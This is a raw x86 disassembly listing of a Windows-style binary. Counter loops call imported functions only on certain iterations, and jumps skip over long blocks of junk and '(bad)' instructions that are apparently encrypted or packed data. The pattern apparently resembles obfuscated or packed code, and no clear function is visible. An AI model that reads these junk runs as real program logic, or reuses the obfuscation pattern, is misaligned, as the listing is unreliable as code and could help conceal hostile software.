  40a141:	mov    ecx,DWORD PTR ds:0x42a781
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a781,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a781,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a781,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a781,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a781
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a781,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7dd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x4360,0xbd
  40a1b4:	repnz iret 
  40a1b6:	loop   0x40a1b1
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	xchg   ebp,eax
  40a1bf:	mov    BYTE PTR [esi+0x47913661],bh
  40a1c5:	sbb    DWORD PTR [edx+0x6fdbba9],edi
  40a1cb:	jnp    0x40a1c8
  40a1cd:	scas   al,BYTE PTR es:[edi]
  40a1ce:	jo     0x40a187
  40a1d0:	jnp    0x40a165
  40a1d2:	mov    dl,0x9b
  40a1d4:	test   esp,edi
  40a1d6:	cmp    BYTE PTR [edi+edi*2-0x45eb5149],0x0
  40a1de:	add    esp,DWORD PTR [edx+0xb089d86]
  40a1e4:	inc    edx
  40a1e5:	cmp    DWORD PTR [ecx-0x1bfca4c],edi
  40a1eb:	data16 jl 0x40a190
  40a1ee:	cmp    ebp,edi
  40a1f0:	inc    esp
  40a1f1:	fs pop ebp
  40a1f3:	xor    DWORD PTR [ebp-0x7c148b7b],esp
  40a1f9:	daa    
  40a1fa:	cmp    ah,ch
  40a1fc:	outs   dx,DWORD PTR ds:[esi]
  40a1fd:	dec    esi
  40a1fe:	adc    esp,DWORD PTR [edi]
  40a200:	fnsave [ecx+0x1f]
  40a203:	mov    ds:0x37a05176,al
  40a208:	and    eax,0xb2e51e3d
  40a20d:	xchg   DWORD PTR [edx],edi
  40a20f:	mov    al,0x8c
  40a211:	pop    ebx
  40a212:	add    ecx,DWORD PTR [ebx+0xb]
  40a215:	out    dx,eax
  40a216:	xor    ebx,DWORD PTR [eax]
  40a218:	jo     0x40a28d
  40a21a:	repz or DWORD PTR [ecx+0x8],edx
  40a21e:	xchg   BYTE PTR [ebp-0x8bbdc8a],ch
  40a224:	das    
  40a225:	arpl   WORD PTR [ecx-0x46],ax
  40a228:	cmc    
  40a229:	mov    esi,0x347e019a
  40a22e:	mov    al,0x26
  40a230:	xor    eax,0x5c0a4ea6
  40a235:	xor    BYTE PTR [ebp+0x38ee1e88],al
  40a23b:	jecxz  0x40a24b
  40a23d:	int3   
  40a23e:	hlt    
  40a23f:	daa    
  40a240:	mov    ebp,0x9a348dbc
  40a245:	adc    bh,BYTE PTR [edi]
  40a247:	xchg   esp,eax
  40a248:	pop    eax
  40a249:	mulps  xmm7,XMMWORD PTR [edi+0x43]
  40a24d:	cdq    
  40a24e:	and    cl,ah
  40a250:	fcomip st,st(1)
  40a252:	adc    al,0x2f
  40a254:	mov    eax,ds:0x84f6f83e
  40a259:	pop    ebx
  40a25a:	pop    eax
  40a25b:	retf   
  40a25c:	pop    ds
  40a25d:	cmp    ax,0x65e2
  40a261:	test   DWORD PTR [edi-0x6531d422],ecx
  40a267:	mov    WORD PTR [ecx-0x4c9b767c],?
  40a26d:	sub    eax,0xf2090029
  40a272:	shr    DWORD PTR [edx-0x5d],cl
  40a275:	pop    edi
  40a276:	nop
  40a277:	jne    0x40a222
  40a279:	sub    dh,bh
  40a27b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a27c:	push   es
  40a27d:	pop    ss
  40a27e:	sbb    DWORD PTR [eax-0x49],edx
  40a281:	mov    ch,0xe8
  40a283:	inc    BYTE PTR [edi-0x15]
  40a286:	ret    
  40a287:	test   DWORD PTR ds:0xaed89f94,eax
  40a28d:	int3   
  40a28e:	cmp    ch,BYTE PTR [edi+esi*8+0x6209e10f]
  40a295:	add    DWORD PTR [esi],ebx
  40a297:	push   edx
  40a298:	inc    esi
  40a299:	adc    al,0x8e
  40a29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a29c:	clc    
  40a29d:	inc    edx
  40a29e:	imul   edx,DWORD PTR [eax-0x4fbfb18a],0x4b
  40a2a5:	iret   
  40a2a6:	imul   DWORD PTR [ecx]
  40a2a8:	push   eax
  40a2a9:	add    DWORD PTR [ebx],0x67f9bae1
  40a2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2b0:	fwait
  40a2b1:	add    eax,0xa9eebcc3
  40a2b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2b7:	sub    ebx,DWORD PTR [ebp+0x66]
  40a2ba:	(bad)  
  40a2bb:	pusha  
  40a2bc:	nop
  40a2bd:	push   edx
  40a2be:	inc    ecx
  40a2bf:	push   es
  40a2c0:	fimul  DWORD PTR [edx]
  40a2c2:	outs   dx,DWORD PTR ds:[esi]
  40a2c3:	pop    esi
  40a2c4:	pop    ebp
  40a2c5:	scas   eax,DWORD PTR es:[edi]
  40a2c6:	sub    BYTE PTR [esi-0x3f],dh
  40a2c9:	ror    ecx,0x46
  40a2cc:	ror    BYTE PTR [ecx-0x1e3416db],0x81
  40a2d3:	or     ah,BYTE PTR [eax-0x29]
  40a2d6:	push   ss
  40a2d7:	cwde   
  40a2d8:	add    eax,0x1eabaead
  40a2dd:	int3   
  40a2de:	sub    BYTE PTR [edi+esi*2-0x1e],bh
  40a2e2:	(bad)  
  40a2e3:	shr    DWORD PTR [ecx],cl
  40a2e5:	pop    edi
  40a2e6:	js     0x40a2a1
  40a2e8:	mov    bl,0x61
  40a2ea:	xchg   ebx,eax
  40a2eb:	xchg   ebx,eax
  40a2ec:	add    ebx,DWORD PTR ds:0x1a94b5d6
  40a2f2:	jbe    0x40a352
  40a2f4:	add    bl,BYTE PTR [edi+0x1a]
  40a2f7:	xlat   BYTE PTR ds:[ebx]
  40a2f8:	jecxz  0x40a2cb
  40a2fa:	inc    edi
  40a2fb:	(bad)  
  40a2fc:	fidivr WORD PTR [eax]
  40a2fe:	push   ebx
  40a2ff:	hlt    
  40a300:	dec    ebx
  40a301:	jnp    0x40a32b
  40a303:	cmp    bh,0x36
  40a306:	stos   DWORD PTR es:[edi],eax
  40a307:	fld    QWORD PTR [ebp+0x4b8cda63]
  40a30d:	inc    esi
  40a30e:	and    al,0xd1
  40a310:	add    BYTE PTR [ebx+0x22],dl
  40a313:	and    ah,BYTE PTR [eax]
  40a315:	adc    DWORD PTR [edi-0x5da15566],ecx
  40a31b:	pop    eax
  40a31c:	pop    ecx
  40a31d:	sub    al,0xb0
  40a31f:	(bad)  [ecx]
  40a321:	scas   eax,DWORD PTR es:[edi]
  40a322:	pushf  
  40a323:	enter  0x6704,0x7c
  40a327:	pop    es
  40a328:	leave  
  40a329:	dec    ecx
  40a32a:	sbb    al,BYTE PTR [edx+0x39f20e26]
  40a330:	pop    ss
  40a331:	inc    esp
  40a332:	scas   eax,DWORD PTR es:[edi]
  40a333:	xchg   ecx,eax
  40a334:	mov    esi,0xde654429
  40a339:	nop
  40a33a:	mov    al,0x8
  40a33c:	or     dl,BYTE PTR ds:0x712b6e32
  40a342:	xor    BYTE PTR [ebx-0x1662b1f1],al
  40a348:	les    eax,FWORD PTR [esi+0xf]
  40a34b:	add    dl,BYTE PTR [eax-0x44]
  40a34e:	cmp    eax,ecx
  40a350:	test   eax,0xd59cfcff
  40a355:	sahf   
  40a356:	cmp    eax,DWORD PTR [ebx-0x3e]
  40a359:	jo     0x40a318
  40a35b:	ss pop es
  40a35d:	call   0x596c:0x261fd67
  40a364:	mov    ebx,0xf5845b66
  40a369:	lds    edi,FWORD PTR [ebp+0x62]
  40a36c:	lds    esp,FWORD PTR [esi-0x4f530fc4]
  40a372:	xchg   ecx,eax
  40a373:	daa    
  40a374:	call   FWORD PTR [ecx-0x2]
  40a377:	into   
  40a378:	aad    0x63
  40a37a:	xlat   BYTE PTR ds:[ebx]
  40a37b:	adc    BYTE PTR [edi+0x17],0x71
  40a37f:	addr16 (bad) 
  40a382:	pop    ds
  40a383:	pop    esp
  40a384:	icebp  
  40a385:	sar    BYTE PTR [ebp+0x3794990e],0xf1
  40a38c:	lock xor bl,0xd1
  40a390:	cmp    BYTE PTR [ecx],cl
  40a392:	or     al,0xf
  40a394:	outs   dx,BYTE PTR ds:[esi]
  40a395:	retf   0xd24f
  40a398:	jmp    0x2fae:0x6becc58b
  40a39f:	fdiv   DWORD PTR [eax-0x17b70961]
  40a3a5:	sbb    BYTE PTR [ebx-0x1b],dh
  40a3a8:	mov    ah,0x64
  40a3aa:	iret   
  40a3ab:	in     al,dx
  40a3ac:	jecxz  0x40a420
  40a3ae:	jne    0x40a359
  40a3b0:	in     eax,0xed
  40a3b2:	dec    esi
  40a3b3:	js     0x40a40c
  40a3b5:	xchg   esp,eax
  40a3b6:	in     al,dx
  40a3b7:	femms  
  40a3b9:	inc    esi
  40a3ba:	mov    ecx,0x60883f56
  40a3bf:	in     eax,0x22
  40a3c1:	in     eax,0xe2
  40a3c3:	and    al,0xe9
  40a3c5:	push   ss
  40a3c6:	pop    ebp
  40a3c7:	xor    bl,BYTE PTR [ebx-0x47b396a1]
  40a3cd:	js     0x40a358
  40a3cf:	fild   WORD PTR [edx+0x63]
  40a3d2:	xor    al,0x3e
  40a3d4:	push   eax
  40a3d5:	inc    ebp
  40a3d6:	test   al,0xf1
  40a3d8:	xlat   BYTE PTR ds:[ebx]
  40a3d9:	push   ebx
  40a3da:	xor    ah,BYTE PTR [eax]
  40a3dc:	cs ss popa 
  40a3df:	jb     0x40a409
  40a3e1:	mul    ebx
  40a3e3:	(bad)  
  40a3e4:	aad    0xd1
  40a3e6:	ret    
  40a3e7:	push   cs
  40a3e8:	sub    eax,0x1f711530
  40a3ed:	test   BYTE PTR [eax],0xf8
  40a3f0:	mov    al,0x6e
  40a3f2:	jae    0x40a3ce
  40a3f4:	iret   
  40a3f5:	dec    ecx
  40a3f6:	inc    ebp
  40a3f7:	loopne 0x40a41d
  40a3f9:	and    eax,0x7971219c
  40a3fe:	ret    0xc7d3
  40a401:	xchg   BYTE PTR [ebx+eiz*1+0x1d],ch
  40a405:	ficomp DWORD PTR [edi]
  40a407:	mov    ds:0x66e522a7,eax
  40a40c:	lahf   
  40a40d:	sbb    eax,0x19fe7ff3
  40a412:	adc    DWORD PTR ds:0x77b7769f,esp
  40a418:	inc    ebx
  40a419:	cs mov al,0x26
  40a41c:	dec    ecx
  40a41d:	and    DWORD PTR [edi-0x548194a2],edi
  40a423:	imul   edi,DWORD PTR [eax+0x6e8e849a],0x3c
  40a42a:	pop    edx
  40a42b:	xchg   edi,eax
  40a42c:	mov    esi,0xb9f4a408
  40a431:	add    BYTE PTR [ebx],ah
  40a433:	inc    ebx
  40a434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a435:	mov    ebx,DWORD PTR [esp]
  40a438:	cmp    eax,0x32988599
  40a43d:	push   es
  40a43e:	fdiv   DWORD PTR [ecx-0x49]
  40a441:	jg     0x40a409
  40a443:	push   esp
  40a444:	pop    edx
  40a445:	(bad)  
  40a447:	loope  0x40a3ec
  40a449:	sbb    al,0xb
  40a44b:	fs (bad) 
  40a44d:	outs   dx,BYTE PTR ds:[esi]
  40a44e:	loopne 0x40a48f
  40a450:	or     esi,edi
  40a452:	out    0xc,al
  40a454:	xchg   ebp,eax
  40a455:	inc    ecx
  40a456:	js     0x40a432
  40a458:	call   0x2c5c112e
  40a45d:	pushf  
  40a45e:	jne    0x40a49a
  40a460:	addr16 jle 0x40a3f1
  40a463:	mov    ecx,0x6f8ecb2c
  40a468:	(bad)
  40a46c:	repz imul edx,DWORD PTR [edi+0x789983a8],0x6f6e6dfe
  40a477:	inc    edi
  40a478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a479:	test   al,0xca
  40a47b:	and    al,ah
  40a47d:	fsub   QWORD PTR ds:0x6803793c
  40a483:	cs icebp 
  40a485:	test   al,0x0
  40a487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a488:	into   
  40a489:	dec    edi
  40a48a:	mov    cl,0x44
  40a48c:	rcr    edx,0xb3
  40a48f:	out    0x1a,eax
  40a491:	dec    ebp
  40a492:	(bad)  
  40a493:	out    0xa,eax
  40a495:	jl     0x40a50c
  40a497:	shr    BYTE PTR [ecx+edx*8-0x2b],1
  40a49b:	inc    ebx
  40a49c:	mov    eax,ds:0x463fd64c
  40a4a1:	mov    ?,WORD PTR [eax+edx*1+0x5a]
  40a4a5:	inc    eax
  40a4a6:	aam    0xa9
  40a4a8:	clc    
  40a4a9:	pop    edx
  40a4aa:	fbstp  TBYTE PTR ds:0xdb25bae1
  40a4b0:	jmp    0x55fd:0x9f373bfe
  40a4b7:	pop    esi
  40a4b8:	and    esp,edx
  40a4ba:	lea    eax,[ebp-0x24]
  40a4bd:	and    DWORD PTR ds:0x42a7ed,0x42a815
  40a4c7:	mov    DWORD PTR [ebp-0x28],eax
  40a4ca:	sub    DWORD PTR ds:0x42a8a9,0x30d0
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a791,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a791
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a791,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a791,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a791,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a791
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a791,ecx
  40a527:	cmp    DWORD PTR ds:0x42a791,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a7bd
  40a53e:	mov    ecx,DWORD PTR ds:0x42a871
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a8a1,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a8a1
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a8a1,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a8a1,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a8a1,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a869,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a869
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a869,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a869,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa82
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a869,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a869
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a869,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a869,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x65],dh
  40a61b:	cmc    
  40a61c:	jmp    0x40a5ae
  40a61e:	fdivp  st(6),st
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	push   ebp
  40a627:	or     eax,0x9b6c4846
  40a62c:	add    al,0x9
  40a62e:	lahf   
  40a62f:	mov    bh,ah
  40a631:	add    eax,0x7bfb221e
  40a636:	jb     0x40a625
  40a638:	cmp    al,0x5a
  40a63a:	repz (bad)
  40a63d:	outs   dx,BYTE PTR ds:[esi]
  40a63e:	cmp    DWORD PTR [ecx],0x6a
  40a641:	pop    edi
  40a642:	pop    ebx
  40a643:	xchg   ebx,eax
  40a644:	ins    DWORD PTR es:[edi],dx
  40a645:	bound  esp,QWORD PTR [ebx-0xc23bae4]
  40a64b:	adc    ecx,esp
  40a64d:	sub    DWORD PTR es:[esi+0x2072c439],ebp
  40a654:	add    DWORD PTR [esi+eax*4],0xffffffd7
  40a658:	mov    edi,0xe4b2c67e
  40a65d:	add    eax,0x993ff554
  40a662:	test   eax,0x279064db
  40a667:	push   ds
  40a668:	iret   
  40a669:	inc    ecx
  40a66a:	scas   eax,DWORD PTR es:[edi]
  40a66b:	sub    ebx,DWORD PTR [esi+0x752bad]
  40a671:	push   sp
  40a673:	mov    eax,0x4007025
  40a678:	inc    esp
  40a679:	fild   QWORD PTR [edi+ecx*1+0x4]
  40a67d:	mov    esi,0xbc8af951
  40a682:	jbe    0x40a65c
  40a684:	or     al,0x1c
  40a686:	or     eax,0x2f09d10b
  40a68b:	stos   BYTE PTR es:[edi],al
  40a68c:	bound  ecx,QWORD PTR [edi]
  40a68e:	jp     0x40a680
  40a690:	inc    eax
  40a691:	rol    eax,1
  40a693:	fcom   QWORD PTR [edi]
  40a695:	mov    eax,ds:0xab1cd371
  40a69a:	scas   al,BYTE PTR es:[edi]
  40a69b:	mov    al,0xc7
  40a69d:	inc    edi
  40a69e:	sbb    al,BYTE PTR [ebp-0x34]
  40a6a1:	sbb    edx,eax
  40a6a3:	jne    0x40a6e2
  40a6a5:	or     edx,DWORD PTR [edx+0x66]
  40a6a8:	aam    0xa
  40a6aa:	and    ch,BYTE PTR [edi-0x37]
  40a6ad:	push   0x3b
  40a6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6b0:	ror    BYTE PTR [ecx],1
  40a6b2:	aaa    
  40a6b3:	pop    ss
  40a6b4:	xchg   esp,eax
  40a6b5:	cmp    BYTE PTR [esi+0x7cbf5059],ah
  40a6bb:	mov    dl,0x8f
  40a6bd:	sbb    bl,BYTE PTR [eax]
  40a6bf:	fwait
  40a6c0:	test   DWORD PTR gs:[ecx+edx*4+0x3b],ecx
  40a6c5:	adc    BYTE PTR [ebx-0x119ebc56],bl
  40a6cb:	pop    es
  40a6cc:	mov    ebx,0xd66893de
  40a6d1:	mov    WORD PTR [ebx+eax*8+0x50],gs
  40a6d5:	and    BYTE PTR [ecx+eax*8-0x79],ah
  40a6d9:	(bad)  
  40a6da:	dec    esi
  40a6db:	push   eax
  40a6dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6dd:	jns    0x40a705
  40a6df:	pop    edx
  40a6e0:	jbe    0x40a700
  40a6e2:	sbb    al,0xd4
  40a6e4:	jns    0x40a6e4
  40a6e6:	pop    ebx
  40a6e7:	mov    dh,dh
  40a6e9:	jmp    0x7cd3:0x94dae3d3
  40a6f0:	xchg   ecx,eax
  40a6f1:	aad    0x4a
  40a6f3:	into   
  40a6f4:	scas   al,BYTE PTR es:[edi]
  40a6f5:	(bad)  
  40a6f7:	sbb    al,0x6b
  40a6f9:	pop    ds
  40a6fa:	bound  esi,QWORD PTR [edi-0x12]
  40a6fd:	bound  esi,QWORD PTR [ebp+0x7c]
  40a700:	dec    edx
  40a701:	retf   0xa42b
  40a704:	jge    0x40a6d8
  40a706:	sbb    DWORD PTR [edx],0xffffff92
  40a709:	push   es
  40a70a:	arpl   WORD PTR [edx],sp
  40a70c:	nop
  40a70d:	loope  0x40a787
  40a70f:	push   ss
  40a710:	(bad)  
  40a711:	sbb    ah,al
  40a713:	test   eax,0xe8ebf139
  40a718:	add    eax,0x2d9d1dc7
  40a71d:	cwde   
  40a71e:	fs in  eax,dx
  40a720:	push   ss
  40a721:	pushf  
  40a722:	or     bh,0xe1
  40a725:	in     eax,dx
  40a726:	paddq  mm1,QWORD PTR [edx+edi*1+0xe71eb94]
  40a72e:	lock sub DWORD PTR [ecx+0x1],edi
  40a732:	jne    0x40a6e8
  40a734:	sub    al,0xec
  40a736:	repz or DWORD PTR ds:0xd4e90caf,esp
  40a73d:	pop    esp
  40a73e:	in     eax,0x78
  40a740:	mov    bl,0x24
  40a742:	cmp    DWORD PTR ds:0x14c4877d,ecx
  40a748:	mov    ds:0xe2333e90,al
  40a74d:	xlat   BYTE PTR ds:[ebx]
  40a74e:	hlt    
  40a74f:	jp     0x40a73c
  40a751:	sbb    ebp,DWORD PTR [edi+0x3bf8c2]
  40a757:	dec    edx
  40a758:	adc    eax,0xd46a296a
  40a75d:	xor    edi,edx
  40a75f:	cli    
  40a760:	enter  0x523,0xfa
  40a764:	daa    
  40a765:	inc    esi
  40a766:	pop    edx
  40a767:	sub    eax,eax
  40a769:	dec    esi
  40a76a:	ror    BYTE PTR [ebp+0x29],cl
  40a76d:	stos   DWORD PTR es:[edi],eax
  40a76e:	arpl   sp,sp
  40a770:	cwde   
  40a771:	fstp   QWORD PTR [ebx-0x38b57d5a]
  40a777:	mov    ds:0x2285514c,eax
  40a77c:	mov    ah,0x12
  40a77e:	clc    
  40a77f:	stos   DWORD PTR es:[edi],eax
  40a780:	cmc    
  40a781:	pop    ss
  40a782:	sti    
  40a783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a784:	das    
  40a785:	invd   
  40a787:	repnz push ds
  40a789:	mov    dl,0x75
  40a78b:	mov    ecx,0xadd6868f
  40a790:	aaa    
  40a791:	push   0x48349121
  40a796:	loope  0x40a74b
  40a798:	push   ecx
  40a799:	jl     0x40a732
  40a79b:	sbb    BYTE PTR [ebp-0x21],dl
  40a79e:	pop    ecx
  40a79f:	xor    cl,BYTE PTR [eax+0x19]
  40a7a2:	jge    0x40a724
  40a7a4:	pusha  
  40a7a5:	and    DWORD PTR [edi+0x5cd92d57],ebp
  40a7ab:	pop    ebx
  40a7ac:	retf   0xc174
  40a7af:	clc    
  40a7b0:	jae    0x40a7a2
  40a7b2:	cld    
  40a7b3:	bound  edx,QWORD PTR [ebp+0x7e8f221f]
  40a7b9:	pop    ecx
  40a7ba:	popf   
  40a7bb:	loopne 0x40a802
  40a7bd:	loopne 0x40a803
  40a7bf:	and    al,0x3c
  40a7c1:	stc    
  40a7c2:	in     eax,0xad
  40a7c4:	pop    edi
  40a7c5:	or     BYTE PTR [ecx],cl
  40a7c7:	test   BYTE PTR [ecx-0x19],bh
  40a7ca:	sbb    ch,al
  40a7cc:	clc    
  40a7cd:	lods   al,BYTE PTR ds:[esi]
  40a7ce:	mov    bh,0x31
  40a7d0:	inc    ebx
  40a7d1:	add    BYTE PTR [ebx+ebp*2-0x63],al
  40a7d5:	mov    dh,0xcf
  40a7d7:	mov    ch,0xda
  40a7d9:	in     al,dx
  40a7da:	out    0x24,eax
  40a7dc:	scas   eax,DWORD PTR es:[edi]
  40a7dd:	sub    ecx,DWORD PTR [ebp-0x5bfcc7f4]
  40a7e3:	push   cs
  40a7e4:	mov    edx,0xdc3873d
  40a7e9:	sti    
  40a7ea:	aas    
  40a7eb:	sbb    BYTE PTR ds:0x5f87796c,dh
  40a7f1:	push   edi
  40a7f2:	sub    eax,0x8d98e8d2
  40a7f7:	mov    BYTE PTR [ecx],bl
  40a7f9:	dec    esp
  40a7fa:	lods   al,BYTE PTR ds:[esi]
  40a7fb:	test   al,0x0
  40a7fd:	neg    DWORD PTR [ecx-0x2521aa5]
  40a803:	lds    edi,FWORD PTR [ecx-0x45c9d881]
  40a809:	xchg   esp,eax
  40a80a:	xor    dl,bh
  40a80c:	sub    BYTE PTR [ebx-0x7],al
  40a80f:	and    eax,DWORD PTR [esi+0x46e84e1b]
  40a815:	pop    ebx
  40a816:	jo     0x40a852
  40a818:	and    DWORD PTR [ebp+0x55ce89f],ebx
  40a81e:	lahf   
  40a81f:	jns    0x40a81a
  40a821:	jb     0x40a833
  40a823:	cmp    eax,0xb92966e0
  40a828:	fwait
  40a829:	push   ecx
  40a82a:	dec    esi
  40a82b:	lea    ebp,[ebx+ecx*2]
  40a82e:	push   ds
  40a82f:	lods   eax,DWORD PTR ds:[esi]
  40a830:	out    0xfd,al
  40a832:	add    BYTE PTR [edi+0x13f4549f],dh
  40a838:	pop    ebp
  40a839:	test   DWORD PTR [ebx],esp
  40a83b:	in     al,0xe7
  40a83d:	sub    eax,0x9ce51db
  40a842:	adc    DWORD PTR [eax],esi
  40a844:	xrelease mov DWORD PTR [esi-0x25],ecx
  40a848:	es sbb dl,dl
  40a84b:	xchg   ebx,eax
  40a84c:	jge    0x40a7fb
  40a84e:	fs jg  0x40a86f
  40a851:	xchg   BYTE PTR [esi],bl
  40a853:	push   ss
  40a854:	imul   esi,DWORD PTR [eax+0x55369306],0xe4e0bab1
  40a85e:	mov    al,ds:0x4b26df18
  40a863:	and    eax,0xf87dc576
  40a868:	cs xchg esp,eax
  40a86a:	les    ebp,FWORD PTR [ebp-0x3f]
  40a86d:	shl    DWORD PTR [edx-0x48],0x92
  40a871:	cmp    DWORD PTR [edi],esi
  40a873:	xor    dh,BYTE PTR [ebx-0x61a993a0]
  40a879:	ins    BYTE PTR es:[edi],dx
  40a87a:	and    al,0x46
  40a87c:	data16 icebp 
  40a87e:	imul   edi
  40a880:	bound  edx,QWORD PTR [eax+0x79]
  40a883:	cmc    
  40a884:	push   0x4
  40a886:	scas   eax,DWORD PTR es:[edi]
  40a887:	adc    eax,0xf49a5680
  40a88c:	(bad)  
  40a88e:	in     al,dx
  40a88f:	arpl   si,di
  40a891:	xor    al,0xc1
  40a893:	js     0x40a82c
  40a895:	jnp    0x40a81f
  40a897:	pop    ebx
  40a898:	sbb    BYTE PTR [esi],ah
  40a89a:	stos   BYTE PTR es:[edi],al
  40a89b:	or     edx,DWORD PTR [edi-0x78]
  40a89e:	fbld   TBYTE PTR [eax-0x6367bacc]
  40a8a4:	sbb    BYTE PTR [edi],0xe7
  40a8a7:	xchg   ecx,eax
  40a8a8:	call   DWORD PTR [edx+0x73929f24]
  40a8ae:	or     eax,0xcfc556c9
  40a8b3:	out    0x62,al
  40a8b5:	(bad)  
  40a8b6:	jae    0x40a8b4
  40a8b8:	std    
  40a8b9:	fcmovnbe st,st(3)
  40a8bb:	call   DWORD PTR [esi-0x64]
  40a8be:	sub    al,0xc4
  40a8c0:	push   cs
  40a8c1:	rcl    cl,0x3f
  40a8c4:	jmp    0xa8b0:0x646839fa
  40a8cb:	jp     0x40a8a2
  40a8cd:	scas   al,BYTE PTR es:[edi]
  40a8ce:	jle    0x40a93a
  40a8d0:	push   eax
  40a8d1:	sahf   
  40a8d2:	mov    ebx,0xa4581732
  40a8d7:	jecxz  0x40a8e5
  40a8d9:	xchg   esp,eax
  40a8da:	sahf   
  40a8db:	in     eax,dx
  40a8dc:	or     al,0x4b
  40a8de:	jb     0x40a90a
  40a8e0:	aas    
  40a8e1:	or     eax,0xca0c1e82
  40a8e6:	iret   
  40a8e7:	mov    BYTE PTR [esi-0x3b],dh
  40a8ea:	push   esi
  40a8eb:	(bad)  
  40a8ec:	(bad)  
  40a8ed:	mov    ch,ah
  40a8ef:	(bad)  
  40a8f0:	mov    esp,0x13e663df
  40a8f5:	pop    eax
  40a8f6:	jg     0x40a927
  40a8f8:	or     al,0xa9
  40a8fa:	pushf  
  40a8fb:	dec    esi
  40a8fc:	(bad)  
  40a8fe:	loop   0x40a923
  40a900:	cs mov dh,0x1c
  40a903:	mov    dl,0x62
  40a905:	aam    0xa1
  40a907:	cmp    al,0x4f
  40a909:	es inc ebx
  40a90b:	pushf  
  40a90c:	sub    ebp,DWORD PTR [ebx+0x7a]
  40a90f:	cmp    eax,0x17
  40a912:	repnz adc ch,cl
  40a915:	push   edi
  40a916:	sbb    cl,BYTE PTR [edx+0x6e3d85e9]
  40a91c:	fs stc 
  40a91e:	jmp    0x89bd5cb9
  40a923:	cmp    BYTE PTR [ebx+0x5d8bec45],cl
  40a929:	clc    
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [esp+edx*8-0x7c2575dc],edi
  40a94d:	js     0x40a9c7
  40a94f:	je     0x40a9cf
